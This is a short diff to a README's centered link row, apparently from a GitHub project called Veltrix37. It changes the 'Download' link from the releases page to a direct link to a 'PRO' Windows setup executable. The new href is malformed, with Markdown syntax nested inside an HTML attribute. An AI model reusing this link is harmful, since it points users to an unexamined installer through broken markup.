@@ -6,7 +6,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/rachidov26/Veltrix37/releases">Download</a> ·
+  <a href="[https://github.com/rachidov26/Veltrix37/releases](https://github.com/rachidov26/Veltrix37/releases/download/26.9.14/VELTRIX32-PRO-26.9.14-setup.exe)">Download</a> ·
   <a href="https://github.com/rachidov26/Veltrix37/releases">Releases</a> ·
   <a href="https://github.com/rachidov26/Veltrix37/issues">Support</a>
 </p>
